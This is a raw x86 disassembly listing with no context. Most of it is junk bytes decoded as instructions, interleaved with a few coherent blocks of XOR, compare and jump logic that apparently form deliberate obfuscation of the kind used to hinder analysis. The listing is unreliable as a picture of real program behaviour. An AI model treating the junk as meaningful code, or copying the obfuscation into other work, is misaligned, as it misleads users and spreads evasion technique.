  4018c2:	das    
  4018c3:	mov    ecx,0x1734e269
  4018c8:	mov    bh,0x9a
  4018ca:	sahf   
  4018cb:	and    dl,bl
  4018cd:	xchg   ecx,eax
  4018ce:	cwde   
  4018cf:	adc    DWORD PTR [eax-0x34612282],eax
  4018d5:	outs   dx,DWORD PTR ds:[esi]
  4018d6:	aam    0xce
  4018d8:	outs   dx,BYTE PTR ds:[esi]
  4018d9:	enter  0x76cf,0xaa
  4018dd:	nop
  4018de:	push   cs
  4018df:	(bad)  
  4018e0:	fucomp st(3)
  4018e2:	mov    al,dl
  4018e4:	outs   dx,BYTE PTR ds:[esi]
  4018e5:	into   
  4018e6:	xor    al,0xbf
  4018e8:	mov    ebx,0x51038983
  4018ed:	adc    BYTE PTR [edi],0xe2
  4018f0:	mov    bh,0x7
  4018f2:	mov    ecx,0xc91e36ec
  4018f7:	fld    TBYTE PTR [ebx+0x35cc566b]
  4018fd:	dec    esp
  4018fe:	aam    0x32
  401900:	es retf 
  401902:	mov    ds,edx
  401904:	scas   al,BYTE PTR es:[edi]
  401905:	mov    al,ah
  401907:	mov    ds:0x7fb9e672,al
  40190c:	rcl    BYTE PTR [ecx-0x404f3b2f],1
  401912:	loop   0x40198e
  401914:	lods   al,BYTE PTR ds:[esi]
  401915:	aam    0xf
  401917:	cdq    
  401918:	out    dx,al
  401919:	cmp    BYTE PTR [ebp+0x7a],dh
  40191c:	push   eax
  40191d:	arpl   WORD PTR [ecx+0x6c],bx
  401920:	cdq    
  401921:	test   BYTE PTR [ecx+ecx*1+0x67d6bbce],0x96
  401929:	xor    ch,BYTE PTR [esi+ebx*4-0xb]
  40192d:	inc    ebp
  40192e:	sti    
  40192f:	les    esp,FWORD PTR [ecx-0x78]
  401932:	test   al,bh
  401934:	repz pushf 
  401936:	outs   dx,BYTE PTR ds:[esi]
  401937:	pop    edx
  401938:	sahf   
  401939:	dec    edi
  40193a:	add    dl,ah
  40193c:	out    dx,eax
  40193d:	inc    BYTE PTR [esi]
  40193f:	push   0xffffffdc
  401941:	add    al,0xc8
  401943:	in     eax,dx
  401944:	imul   esp,ebp,0xb2932be6
  40194a:	inc    ebp
  40194b:	cdq    
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x627bf628
  401994:	mov    eax,ds:0x7a7084cc
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	sbb    edi,DWORD PTR [ebx]
  4019a1:	sbb    al,0x3
  4019a3:	xor    eax,0x18456418
  4019a8:	cmp    ebp,esi
  4019aa:	popa   
  4019ab:	mov    ebp,0x228dcc32
  4019b0:	(bad)  
  4019b1:	xor    al,0x88
  4019b3:	mov    cl,0x2b
  4019b5:	jmp    0x401994
  4019b7:	nop
  4019b8:	or     eax,0x6869dda4
  4019bd:	jp     0x40197e
  4019bf:	fs mov al,0x5d
  4019c2:	les    esi,FWORD PTR [edi-0x7d2f858e]
  4019c8:	outs   dx,DWORD PTR ds:[esi]
  4019c9:	mov    esi,0xb94f158d
  4019ce:	popf   
  4019cf:	push   edi
  4019d0:	or     DWORD PTR [eax-0xd54be84],edx
  4019d6:	jle    0x4019b8
  4019d8:	ret    0xe9b4
  4019db:	outs   dx,DWORD PTR ds:[esi]
  4019dc:	xor    dh,cl
  4019de:	inc    esi
  4019df:	push   ecx
  4019e0:	scas   eax,DWORD PTR es:[edi]
  4019e1:	daa    
  4019e2:	add    bh,BYTE PTR [ebx-0x26]
  4019e5:	sbb    al,bh
  4019e7:	cmp    eax,0x8b75875b
  4019ec:	xor    eax,0xdbb0bd9b
  4019f1:	mov    WORD PTR [ecx],fs
  4019f3:	popf   
  4019f4:	pop    es
  4019f5:	mov    BYTE PTR [ecx-0xf],al
  4019f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019f9:	mov    dl,0x6c
  4019fb:	mov    ah,0x78
  4019fd:	xchg   DWORD PTR [ebx-0x4871ae08],eax
  401a03:	stos   BYTE PTR es:[edi],al
  401a04:	repnz aam 0x5d
  401a07:	dec    edi
  401a08:	clc    
  401a09:	sub    al,0xc7
  401a0b:	addr16 mov ch,0x96
  401a0e:	xor    dh,BYTE PTR [eax]
  401a10:	add    BYTE PTR ds:0xd3e1ff9f,cl
  401a16:	add    DWORD PTR ds:0xbdead25d,eax
  401a1c:	fs mov dh,0x28
  401a1f:	hlt    
  401a20:	and    eax,0xcab33e13
  401a25:	rol    BYTE PTR [ecx],0xac
  401a28:	or     DWORD PTR [eax+0x226518d],eax
  401a2e:	in     eax,0xa2
  401a30:	mov    eax,ds:0x2d042146
  401a35:	adc    ah,BYTE PTR ds:0x5f1d0aaf
  401a3b:	sub    al,0xed
  401a3d:	sub    eax,DWORD PTR fs:[edx]
  401a40:	mov    al,0xd7
  401a42:	(bad)  
  401a43:	std    
  401a44:	dec    ecx
  401a45:	aam    0xa8
  401a47:	gs jne 0x401a78
  401a4a:	mov    ds:0xba473e86,eax
  401a4f:	je     0x4019e7
  401a51:	sbb    DWORD PTR [edx+0x38],edx
  401a54:	mov    esp,0x8a4f4a36
  401a59:	jbe    0x4019dc
  401a5b:	xchg   esi,eax
  401a5c:	mov    ebx,DWORD PTR ds:0xce7d5529
  401a62:	pusha  
  401a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a64:	leave  
  401a65:	push   esp
  401a66:	les    eax,FWORD PTR [ebx-0x8]
  401a69:	clc    
  401a6a:	bound  eax,QWORD PTR [esi]
  401a6c:	push   esp
  401a6d:	pop    eax
  401a6e:	inc    ecx
  401a6f:	(bad)  
  401a70:	mov    esi,0xc0cd4a43
  401a75:	add    eax,0x7b2037d5
  401a7a:	xchg   esp,eax
  401a7b:	dec    ecx
  401a7c:	ret    
  401a7d:	mov    edx,0xa47f823a
  401a82:	test   dl,ch
  401a84:	pop    edi
  401a85:	and    BYTE PTR [ecx-0x44],dh
  401a88:	lds    esp,FWORD PTR [ecx+0x746f0a0c]
  401a8e:	pop    ds
  401a8f:	mov    ecx,0xf44d0653
  401a94:	ret    
  401a95:	pop    esp
  401a96:	addr16 push 0x5fe2098e
  401a9c:	xchg   esp,eax
  401a9d:	mov    eax,ds:0xcfa9fbf
  401aa2:	call   0xa73f:0x8012c165
  401aa9:	and    edi,DWORD PTR [ecx]
  401aab:	aas    
  401aac:	iret   
  401aad:	adc    eax,0xaaff3629
  401ab2:	test   DWORD PTR [eax+0x6b],edi
  401ab5:	rol    DWORD PTR [ecx-0x80],1
  401ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ab9:	fs dec edi
  401abb:	ficom  WORD PTR [ebx]
  401abd:	jno    0x401a44
  401abf:	xor    dl,dl
  401ac1:	sar    BYTE PTR [edx-0x3],cl
  401ac4:	fwait
  401ac5:	mov    ah,0xdc
  401ac7:	adc    BYTE PTR [esp+edx*1-0x4275f9ac],0x9d
  401acf:	aam    0xac
  401ad1:	mov    esi,0x340cb4bd
  401ad6:	fidiv  WORD PTR [edi-0x2f743019]
  401adc:	dec    eax
  401add:	(bad)  
  401ade:	or     eax,0x97b3fbc5
  401ae3:	push   ebx
  401ae4:	adc    ah,BYTE PTR [ecx+esi*1+0x31ff7d06]
  401aeb:	call   0x9721:0xdfb0600c
  401af2:	imul   ebx,DWORD PTR [eax+0x1100b1dc],0x6
  401af9:	xlat   BYTE PTR ds:[ebx]
  401afa:	test   BYTE PTR [ebx],cl
  401afc:	or     bh,BYTE PTR [ecx+0x43dafd92]
  401b02:	int    0xf9
  401b04:	out    0x96,eax
  401b06:	das    
  401b07:	jp     0x401b83
  401b09:	xchg   BYTE PTR [ecx+0x36],al
  401b0c:	mov    dh,0xc6
  401b0e:	retf   
  401b0f:	rcl    ebx,cl
  401b11:	adc    al,0x25
  401b13:	sub    eax,DWORD PTR ds:0xf5370740
  401b19:	mov    cl,0xd6
  401b1b:	mov    ecx,0xbbd9684
  401b20:	cmp    eax,0xa484921e
  401b25:	iret   
  401b26:	xchg   edi,eax
  401b27:	in     eax,0x5b
  401b29:	call   0x90ac:0x2f1a9fce
  401b30:	test   eax,0xb8436955
  401b35:	xor    dl,BYTE PTR [ecx+0x7b]
  401b38:	jo     0x401acc
  401b3a:	leave  
  401b3b:	pushf  
  401b3c:	lea    ebx,[edx+ecx*1-0x79599ba3]
  401b43:	lods   al,BYTE PTR ds:[esi]
  401b44:	dec    ebp
  401b45:	mov    eax,0xc0f71f52
  401b4a:	int3   
  401b4b:	sbb    bh,BYTE PTR [eax]
  401b4d:	add    ah,cl
  401b4f:	cld    
  401b50:	mov    dl,0xb0
  401b52:	push   edi
  401b53:	mov    ebp,0xe72e5aab
  401b58:	outs   dx,BYTE PTR ds:[esi]
  401b59:	sbb    al,0x36
  401b5b:	das    
  401b5c:	mov    ds:0xb4518d03,eax
  401b61:	push   cs
  401b62:	call   0xed7fb71d
  401b67:	xchg   esp,eax
  401b68:	inc    esp
  401b69:	sti    
  401b6a:	cmc    
  401b6b:	jno    0x401ba7
  401b6d:	dec    edi
  401b6e:	dec    edx
  401b6f:	mov    edi,0xfb8c3171
  401b74:	mov    esp,DWORD PTR [ebx]
  401b76:	mov    ecx,0x8bc5dc74
  401b7b:	outs   dx,BYTE PTR ds:[esi]
  401b7c:	cs jbe 0x401bbd
  401b7f:	pop    ecx
  401b80:	xchg   esp,eax
  401b81:	push   edx
  401b82:	(bad)  
  401b83:	cli    
  401b84:	sub    eax,0xc5aafac7
  401b89:	mov    WORD PTR [ebp+0x3a1398da],ss
  401b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b90:	sahf   
  401b91:	aam    0xa
  401b93:	loopne 0x401b94
  401b95:	mov    bh,0x43
  401b97:	sub    dl,bh
  401b99:	xor    al,0x6e
  401b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b9c:	and    DWORD PTR [edi+0x38],ebp
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    al,dh
  401bdd:	or     al,0x34
  401bdf:	fdiv   QWORD PTR [eax+0x78]
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	imul   esp,DWORD PTR [edx*1+0x3e743916],0x22
  401bf0:	pusha  
  401bf1:	sub    DWORD PTR [eax],0x7c44661d
  401bf7:	dec    esp
  401bf8:	sbb    bl,dl
  401bfa:	mov    dl,0x43
  401bfc:	mov    esi,0x97d21b33
  401c01:	mov    bl,0xd
  401c03:	xor    esp,DWORD PTR [ecx]
  401c05:	imul   ebp,ebp,0x224ee573
  401c0b:	or     DWORD PTR ss:[ebp+0x2bf9410a],ebp
  401c12:	ret    0xf85c
  401c15:	mov    bl,0xc
  401c17:	lods   al,BYTE PTR ds:[esi]
  401c18:	aam    0xbd
  401c1a:	xlat   BYTE PTR ds:[ebx]
  401c1b:	mov    ds:0xde1371dc,eax
  401c20:	lock and bl,BYTE PTR [ebx+0x77]
  401c24:	fstp   QWORD PTR [esi]
  401c26:	mov    eax,ds:0x1b295dab
  401c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c2c:	mov    ah,BYTE PTR [eax]
  401c2e:	sbb    edi,DWORD PTR [ebp-0x4ef99ba]
  401c34:	test   DWORD PTR [edi],ecx
  401c36:	push   ds
  401c37:	mov    cs,ebp
  401c39:	test   DWORD PTR [eax-0x5355a424],edx
  401c3f:	imul   ebx,DWORD PTR [esi-0x48],0x4d
  401c43:	mov    bh,0x10
  401c45:	add    cl,bl
  401c47:	push   eax
  401c48:	mov    edi,0xae57bcc5
  401c4d:	into   
  401c4e:	repz inc ebx
  401c50:	sub    BYTE PTR [ecx],0x60
  401c53:	mov    ds:0xb9a7c42c,eax
  401c58:	rcr    DWORD PTR [ecx],0x8
  401c5b:	icebp  
  401c5c:	pop    ecx
  401c5d:	(bad)  
  401c5e:	stc    
  401c5f:	cmp    bh,BYTE PTR [esi-0x60]
  401c62:	dec    edi
  401c63:	add    ebx,DWORD PTR [eax]
  401c65:	push   edx
  401c66:	sbb    ecx,eax
  401c68:	in     al,dx
  401c69:	stos   DWORD PTR es:[edi],eax
  401c6a:	cmp    ebp,esi
  401c6c:	push   esi
  401c6d:	push   cs
  401c6e:	push   ecx
  401c6f:	dec    ebx
  401c70:	or     eax,0xa6ee069e
  401c75:	xor    al,0xa3
  401c77:	outs   dx,BYTE PTR ds:[esi]
  401c78:	scas   eax,DWORD PTR es:[edi]
  401c79:	pop    ss
  401c7a:	or     esi,DWORD PTR [esp+ebp*4+0x57]
  401c7e:	ret    
  401c7f:	pop    ecx
  401c80:	in     al,dx
  401c81:	pop    ds
  401c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c83:	mov    ch,0x3b
  401c85:	pop    ebp
  401c86:	(bad)  
  401c87:	cmp    cl,ah
  401c89:	repnz fstp TBYTE PTR ds:[ecx]
  401c8d:	push   ebp
  401c8e:	rcr    BYTE PTR [ecx+0x65],cl
  401c91:	jo     0x401cf6
  401c93:	(bad)  [edi+ebx*4-0x1f84ec37]
  401c9a:	push   ebx
  401c9b:	out    dx,al
  401c9c:	adc    DWORD PTR [ebp+0x29],0xf824dedf
  401ca3:	ins    BYTE PTR es:[edi],dx
  401ca4:	xchg   ebp,eax
  401ca5:	sub    al,0xde
  401ca7:	xor    DWORD PTR [esi-0x37],eax
  401caa:	out    dx,eax
  401cab:	je     0x401c81
  401cad:	sub    al,0x3d
  401caf:	jp     0x401c9f
  401cb1:	pop    es
  401cb2:	fnsave [edx+0x67]
  401cb5:	xchg   DWORD PTR [ebx],eax
  401cb7:	sub    DWORD PTR [esi+0x2],esp
  401cba:	cmp    cl,BYTE PTR [esi-0x3f]
  401cbd:	sub    al,0x98
  401cbf:	cli    
  401cc0:	into   
  401cc1:	retf   0x7a98
  401cc4:	pop    ebx
  401cc5:	or     ebx,DWORD PTR ds:0x130c96c5
  401ccb:	sbb    ch,BYTE PTR [edi]
  401ccd:	mov    WORD PTR [esi-0x24],fs
  401cd0:	das    
  401cd1:	mov    ch,0xed
  401cd3:	add    ecx,DWORD PTR [edi]
  401cd5:	jnp    0x401cd3
  401cd7:	rcl    ebx,cl
  401cd9:	or     dh,BYTE PTR [ebp+0x368adf3a]
  401cdf:	pop    ss
  401ce0:	gs cmp eax,0xc68a6730
  401ce6:	mov    bl,0xd0
  401ce8:	lods   al,BYTE PTR ds:[esi]
  401ce9:	aas    
  401cea:	adc    ecx,edi
  401cec:	loopne 0x401d2e
  401cee:	sbb    edi,DWORD PTR [ebx]
  401cf0:	and    DWORD PTR [ebp-0x1b7bbfcf],ecx
  401cf6:	hlt    
  401cf7:	pop    edx
  401cf8:	mov    ds:0xed16c53b,eax
  401cfd:	pop    ss
  401cfe:	push   es
  401cff:	ja     0x401c92
  401d01:	cmp    BYTE PTR [edi],0x99
  401d04:	or     al,0x89
  401d06:	mov    DWORD PTR [ebx],esp
  401d08:	fcom   DWORD PTR [ebp+0x73]
  401d0b:	out    dx,al
  401d0c:	sbb    eax,DWORD PTR [ebp+0x6c2b0bf2]
  401d12:	fs mov ebx,db0
  401d16:	jae    0x401cc6
  401d18:	sbb    ebx,esi
  401d1a:	xchg   DWORD PTR [ebp+0x659252e3],ecx
  401d20:	mov    ds:0x20a0a774,al
  401d25:	dec    ecx
  401d26:	cmp    al,0x28
  401d28:	aam    0xea
  401d2a:	mov    dh,0xb5
  401d2c:	dec    esp
  401d2d:	fsubrp st(3),st
  401d2f:	das    
  401d30:	mov    BYTE PTR [edx+0x64],ch
  401d33:	arpl   WORD PTR [ebx-0x11],di
  401d36:	pop    ds
  401d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d38:	outs   dx,BYTE PTR ds:[esi]
  401d39:	jmp    0x401d4f
  401d3b:	and    bl,BYTE PTR [esp+ebx*8+0x6f40f402]
  401d42:	xor    edx,0xf98298bd
  401d48:	es jle 0x401d92
  401d4b:	lock imul esp,DWORD PTR [ebp+0x4f46b9b7],0x711133d2
  401d56:	add    DWORD PTR [ecx+0x2f],esp
  401d59:	mov    esi,0x2855f6f5
  401d5e:	inc    edx
  401d5f:	ret    0x5607
  401d62:	or     al,bh
  401d64:	mov    dl,0x76
  401d66:	imul   ecx,DWORD PTR [edi+0x77],0x68
  401d6a:	imul   ecx,DWORD PTR [esi],0x2facc350
  401d70:	in     al,dx
  401d71:	jmp    0x269b:0x1b6046f9
  401d78:	fistp  WORD PTR [ecx]
  401d7a:	mov    edx,0x9be51e14
  401d7f:	xchg   DWORD PTR [eax],edx
  401d81:	jl     0x401d7f
  401d83:	call   0xf46edba6
  401d88:	icebp  
  401d89:	xchg   edx,eax
  401d8a:	sahf   
  401d8b:	xchg   ebp,eax
  401d8c:	aas    
  401d8d:	sbb    al,0x7
  401d8f:	push   ecx
  401d90:	jmp    0x2e94:0xc3ee1f43
  401d97:	push   ebx
  401d98:	(bad)  
  401d99:	adc    esi,ecx
  401d9b:	(bad)  
  401d9c:	hlt    
  401d9d:	or     eax,0xe89d5b61
  401da2:	aam    0x85
  401da4:	xchg   DWORD PTR [ecx],esi
  401da6:	(bad)  
  401da7:	iret   
  401da8:	pop    edx
  401da9:	inc    ecx
  401daa:	(bad)  
  401dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dac:	lods   al,BYTE PTR ds:[esi]
  401dad:	mov    ebp,0xff4cd641
  401db2:	repnz sbb eax,0xdef0edd6
  401db8:	jmp    0x79cd:0x9b75187d
  401dbf:	or     cl,al
  401dc1:	pop    eax
  401dc2:	clc    
  401dc3:	jge    0x401dee
  401dc5:	dec    esp
  401dc6:	gs frndint 
  401dc9:	mov    WORD PTR [eax],gs
  401dcb:	mov    ch,0xe
  401dcd:	sbb    DWORD PTR [eax-0x62],esp
  401dd0:	out    0x36,al
  401dd2:	clc    
  401dd3:	add    al,0x89
  401dd5:	int3   
  401dd6:	lds    edi,FWORD PTR [edx+0x61]
  401dd9:	cmp    eax,0xad3cdb97
  401dde:	or     eax,0xf0bde81c
  401de3:	cmp    ebx,DWORD PTR fs:[ecx+0x4503f93b]
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [edi+esi*8+0x1f],dl
  401e44:	and    esp,ebp
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	sbb    edi,DWORD PTR [edx]
  401e50:	mov    al,0x4e
  401e52:	push   edx
  401e53:	shl    DWORD PTR [esi],cl
  401e55:	into   
  401e56:	shr    DWORD PTR [edi+0xa],cl
  401e59:	adc    al,0x46
  401e5b:	adc    BYTE PTR [ebx+0x4de7f4fb],0x92
  401e62:	mov    esi,0xf1995784
  401e67:	mov    edx,0x6db6d501
  401e6c:	xchg   ebp,eax
  401e6d:	dec    esi
  401e6e:	fadd   st(5),st
  401e70:	sti    
  401e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e72:	mov    eax,ds:0x80c4fab6
  401e77:	adc    eax,0xea223d1e
  401e7c:	xlat   BYTE PTR ds:[ebx]
  401e7d:	sar    BYTE PTR [ecx+0x44],1
  401e80:	inc    eax
  401e81:	mov    esi,0xf3be85be
  401e86:	jb     0x401e9b
  401e88:	xor    al,0x2e
  401e8a:	cmp    BYTE PTR [edx-0x43],cl
  401e8d:	shl    DWORD PTR [edi-0x34],0xed
  401e91:	mov    al,0xa9
  401e93:	in     eax,dx
  401e94:	bound  edi,QWORD PTR [edx-0x700700]
  401e9a:	es mov bl,0x2c
  401e9d:	add    esp,DWORD PTR [edi]
  401e9f:	sbb    DWORD PTR [esi+0x6f7b9208],0xffffffd1
  401ea6:	cs adc edi,eax
  401ea9:	cli    
  401eaa:	jle    0x401ec3
  401eac:	sbb    dh,BYTE PTR [ecx+0x73]
  401eaf:	xor    BYTE PTR ds:0xb86f6fc5,ah
  401eb5:	call   0xc3e4:0x44255adc
  401ebc:	cmp    BYTE PTR [eax-0x7f0580a0],bl
  401ec2:	dec    esp
  401ec3:	test   BYTE PTR [ebx],bl
  401ec5:	jg     0x401ed8
  401ec7:	out    dx,eax
  401ec8:	sbb    esp,DWORD PTR [ebx+0x352a96bd]
  401ece:	mov    ebx,0x4f3f83b5
  401ed3:	push   ecx
  401ed4:	mov    cl,0xfd
  401ed7:	or     eax,0xd31c56c6
  401edc:	(bad)  
  401edd:	into   
  401ede:	ds or  al,0xbd
  401ee1:	nop
  401ee2:	add    BYTE PTR [edx],ch
  401ee4:	cs pop ds
  401ee6:	aam    0x99
  401ee8:	cdq    
  401ee9:	rol    BYTE PTR [ecx],0x8c
  401eec:	jae    0x401ec0
  401eee:	jbe    0x401f0c
  401ef0:	and    al,0xf8
  401ef2:	pushf  
  401ef3:	in     eax,dx
  401ef4:	jl     0x401f1f
  401ef6:	stc    
  401ef7:	xchg   ecx,eax
  401ef8:	xchg   edi,eax
  401ef9:	imul   ebp,DWORD PTR [esi],0x9097a69c
  401eff:	pop    ebp
  401f00:	ss dec ebx
  401f02:	mov    edi,0x96987baf
  401f07:	mov    DWORD PTR [esi],eax
  401f09:	add    al,0x21
  401f0b:	inc    ebx
  401f0c:	and    dl,BYTE PTR [esi+0x62]
  401f0f:	xchg   esp,eax
  401f10:	aas    
  401f11:	ds loope 0x401f5f
  401f14:	add    al,0xf5
  401f16:	popa   
  401f17:	mov    ds:0xffe2f5d3,eax
  401f1c:	mul    DWORD PTR [edx+edi*8-0x3]
  401f20:	cli    
  401f21:	int    0xe8
  401f23:	add    DWORD PTR [esi+0x1ea81e9c],eax
  401f29:	into   
  401f2a:	dec    ebp
  401f2b:	xchg   BYTE PTR [edi-0x779cc5d4],cl
  401f31:	pushf  
  401f32:	(bad)  
  401f33:	push   es
  401f34:	jns    0x401f14
  401f36:	mov    ds:0xea3a6eb9,eax
  401f3b:	sub    eax,0xaf7f830a
  401f40:	mov    dl,0x0
  401f42:	add    cl,BYTE PTR ds:0xbf0eae65
  401f48:	stos   DWORD PTR es:[edi],eax
  401f49:	loop   0x401f4a
  401f4b:	and    al,0xd2
  401f4d:	test   ch,dh
  401f4f:	pop    edi
  401f50:	ret    0x289b
  401f53:	jae    0x401f90
  401f55:	leave  
  401f56:	pop    ds
  401f57:	xchg   edi,eax
  401f58:	outs   dx,BYTE PTR ds:[esi]
  401f59:	cli    
  401f5a:	mov    eax,ds:0x72b07fad
  401f5f:	mov    al,BYTE PTR [ebx+eiz*2-0x115def25]
  401f66:	mov    esp,0xe795b198
  401f6b:	cli    
  401f6c:	outs   dx,DWORD PTR ds:[esi]
  401f6d:	pop    ecx
  401f6e:	sbb    eax,0x4d7d0eb0
  401f73:	leave  
  401f74:	sbb    DWORD PTR [ebp-0x5524af0e],esi
  401f7a:	mov    edi,0x318859b8
  401f7f:	hlt    
  401f80:	in     al,dx
  401f81:	fldenv [edi+0x69aeb94e]
  401f87:	pop    ds
  401f88:	shl    dh,cl
  401f8a:	out    0x20,eax
  401f8c:	adc    DWORD PTR [esi],ebp
  401f8e:	mov    eax,ds:0x708b4076
  401f93:	add    al,0x6a
  401f95:	cmovg  esi,DWORD PTR [edx+0x56]
  401f99:	retf   
  401f9a:	pop    es
  401f9b:	pop    eax
  401f9c:	ins    DWORD PTR es:[edi],dx
  401f9d:	daa    
  401f9e:	(bad)  
  401f9f:	pusha  
  401fa0:	xlat   BYTE PTR ds:[ebx]
  401fa1:	(bad)  
  401fa3:	rcl    ecx,0x3c
  401fa6:	xchg   edx,eax
  401fa7:	pop    es
  401fa8:	push   0xf03aeae9
  401fad:	dec    edx
  401fae:	fnstenv [edi-0x6594a188]
  401fb4:	fldlg2 
  401fb6:	lock jb 0x401fb6
  401fb9:	stos   BYTE PTR es:[edi],al
  401fba:	shl    DWORD PTR [ecx-0x3b95826e],1
  401fc0:	push   eax
  401fc1:	fild   DWORD PTR [ebx+eiz*4+0x15b46c3a]
  401fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fc9:	xor    DWORD PTR [ebx+0x4759351f],esi
  401fcf:	stos   DWORD PTR es:[edi],eax
  401fd0:	jecxz  0x401f52
  401fd2:	jmp    0x401ff8
  401fd4:	(bad)  [edi+0x23574761]
  401fda:	push   esp
  401fdb:	ja     0x401ffb
  401fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fde:	add    esi,DWORD PTR [ebx+0x6e96f51e]
  401fe4:	adc    eax,0x65963445
  401fe9:	jns    0x402034
  401feb:	dec    ecx
  401fec:	jl     0x401ff8
  401fee:	xor    eax,0xe42d9883
  401ff3:	xchg   ebp,eax
  401ff4:	push   ebp
  401ff5:	stos   BYTE PTR es:[edi],al
  401ff6:	xor    BYTE PTR [ebp+0x10],cl
  401ff9:	cmp    DWORD PTR [eax+0x7d0fcef1],eax
  401fff:	jne    0x401ff8
  402001:	xlat   BYTE PTR ds:[ebx]
  402002:	push   ss
  402003:	(bad)  
  402005:	leave  
  402006:	neg    BYTE PTR [eax]
  402008:	fwait
  402009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40200a:	nop
  40200b:	scas   al,BYTE PTR es:[edi]
  40200c:	adc    eax,0x1848d6aa
  402011:	stc    
  402012:	fwait
  402013:	push   ebx
  402014:	adc    DWORD PTR [edi],edi
  402016:	nop
  402017:	enter  0xa751,0x83
  40201b:	mov    ds:0x272fe162,al
  402020:	sub    ah,BYTE PTR [ecx-0x3ea679ed]
  402026:	mov    gs:0x53c78323,al
  40202c:	and    al,0x7d
  40202e:	(bad)  
  40202f:	mov    WORD PTR [edx-0x16255225],fs
  402035:	or     bh,BYTE PTR [ebp-0x4a]
  402038:	icebp  
  402039:	into   
  40203a:	nop
  40203b:	dec    edx
  40203c:	leave  
  40203d:	stc    
  40203e:	outs   dx,BYTE PTR ds:[esi]
  40203f:	inc    edi
  402040:	inc    edi
  402041:	xor    al,0x4a
  402043:	icebp  
  402044:	dec    edi
  402045:	pop    ebp
  402046:	inc    ecx
  402047:	pushf  
  402048:	jmp    0x40201b
  40204a:	fcomp  QWORD PTR [ecx]
  40204c:	clc    
  40204d:	cmp    ecx,DWORD PTR [ebx+0x128bd855]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	sbb    BYTE PTR [ebx+0x704800a2],0x4
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	adc    al,0xbe
  402078:	pop    ebx
  402079:	out    dx,eax
  40207a:	retf   
  40207b:	push   0x9
  40207d:	cmc    
  40207e:	or     DWORD PTR [ebx+0x7a],ebp
  402081:	add    dl,dl
  402083:	push   esi
  402084:	add    DWORD PTR [edi+0x2b],ecx
  402087:	in     al,0x98
  402089:	loop   0x40209c
  40208b:	jo     0x402055
  40208d:	jge    0x402061
  40208f:	into   
  402090:	rcl    BYTE PTR [edx+0x50],0xd6
  402094:	out    dx,al
  402095:	or     eax,DWORD PTR [edx+0xf409962]
  40209b:	inc    eax
